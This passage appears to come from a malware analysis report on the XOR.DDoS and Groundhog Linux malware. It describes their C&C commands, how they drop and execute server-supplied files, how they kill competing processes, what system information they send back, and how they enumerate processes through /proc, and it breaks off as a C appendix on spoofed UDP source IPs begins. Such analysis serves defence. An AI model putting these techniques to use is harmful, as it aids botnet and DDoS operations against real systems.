to generate a new file with a random filename. The file’s content is received from the C&C server.\n\nThe malware tries to save the file in one of the following folders:\n\n```\n/bin/\n/sbin/\n/usr/\n/usr/bin/\n/boot/\n/tmp/\n\n```\n\nAfter performing the above operations, the malware changes its mode to “0755” and executes the newly created file.\n\n**_[13] KILL_COLLECT_**\nThis KILL_COLLECT command uses the configuration data received by the Command ID 0—Configuration Update command to\nperform the following operations:\n\n- Enumerate all processes currently running in the system. For each process, it checks if the process name is present in the\n${filename} list.\n\n- If it is present, the process is killed and the executable file associated with the process is removed.\n\n- Collect information about the current socket connections for all processes. For each connection, it checks if the connecting IP\naddress is present in the ${denyip} list.\n\n- If it is present, the malware kills the process and removes the executable file associated with process.\n\n- Collect information from the running processes in this format:\n\n\n${pid}\\t||${path_to_file}\\t||${proc_name}\n\n\nThe collected data is sent back to the C&C server.\n\nThe algorithm that collects the process and network information can be found in Appendix A – System Information Collection Routine.\n\n\n-----\n\n**MALWARE OPERATION**\n**Operation Modes**\nThe malware has the ability to work in one of the following modes:\n\n**Mode** **Description**\n\nGet Command Receives commands from the C&C server. (Some of the received data is used later in the SEND_INFO_MODE mode).\nMode It can send information about the currently running processes (see KILL_COLLECT command for a full\ndescription).\n\nSend Info Mode Collects information and sends it back to the C&C server. See Send Info Mode for a full description.\n\nTo switch from GET_CMD_MODE to SEND_INFO_MODE, the C&C server can send the Command ID 9: NEW_CONN command or the\n_SWT_MODE command._\n\nThe following sections provide a detailed description of these execution modes.\n\n**_Get Command Mode_**\nIn this mode, the malware repeatedly tries to connect to the C&C server to receive and process commands.\n\n**_Send Info Mode_**\nThis mode is used by the malware to send information to the C&C server.\n\nTwo different types of information structures can be sent. The information type is set by the C&C server using the SET_SESS_ID\ncommand.\n\n**Type** **Description**\n\nOS_INFO OS specific information, which includes:\n\n             - Local IP address\n\n             - Number of processors\n\n             - Amount of physical memory (in MB)\n\n             - OS release version\n\n             - Hardware identifier\n\n             - Malware version\n\nFILES_INFO The malware checks for the presence of files specified in the ${flag} key in the UPDATE_CONF command.\n\nIf the file is present, the malware appends the second part of the ${flag} string value to the current $\n```\n          {session_id}.\n\n```\nThe ${flag} field has the following format:\n\n${path_to_file}|${string_to_be_appended}\n\nThis is an example of a ${flag} value received from a live C&C:\n\n|Mode|Description|\n|---|---|\n|Get Command Mode|Receives commands from the C&C server. (Some of the received data is used later in the SEND_INFO_MODE mode).

See Send Info Mode for a full description.|\n\n|Type|Description|\n|---|---|\n|OS_INFO|OS specific information, which includes: • Local IP address • Number of processors • Amount of physical memory (in MB) • OS release version • Hardware identifier • Malware version|\n|FILES_INFO|The malware checks for the presence of files specified in the ${flag} key in the UPDATE_CONF command. If the file is present, the malware appends the second part of the ${flag} string value to the current $ {session_id}. The ${flag} field has the following format: ${path_to_file}|${string_to_be_appended}|\n\n\nflag=/var/run/gcc.pid|g\n\n\nAs the same file is used in the XOR.DDoS malware, we assume that the ${flag} value can be used to check if another module is\npresent on the infected machine.\n\n\n-----\n\n###### APPENDIX A—SYSTEM INFORMATION COLLECTION ROUTINE\n\nThe following is a description of the system information collection routine as performed by both the XOR.DDoS and Groundhog\nmalwares.\n\n1. The malware enumerates all currently running processes using this folder:\n\n```\n/proc/\n\n```\n\n\n- Reads all symbolic links in this directory to get information about open connections:\n\n```\n/proc/${pid}/fd/\n\n```\n\nThe malware checks if the content contains the following string to get the inode information:\n\n```\nsocket:[%d]\n\n```\n\nThe malware adds the PID and process connection information.\n\n- Collects the process name using this file:\n\n```\n/proc/${pid}/exe\n\n```\n\n\n- Collects the process arguments using this file in the case of Groundhog:\n\n```\n/proc/${pid}/cmdline\n\n```\n\n2. The malware parses the following files to get the complete list of network remote connections:\n\n```\n/proc/net/tcp\n/proc/net/tcp6 (only in case of Groundhog)\n\n```\n\n\n- Gets the following information from the files:\n\n```\nConnection inode\nLocal port\nRemote IP address\nRemote port\n\n```\n\nNote: the malware only considers connections with a decimal integer value as a TCP state.\n\n\n-----\n\n###### APPENDIX B—UDP PACKET S SOURCE IP GENERATION ALGORITHM\n\n```\n#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\nint main(int
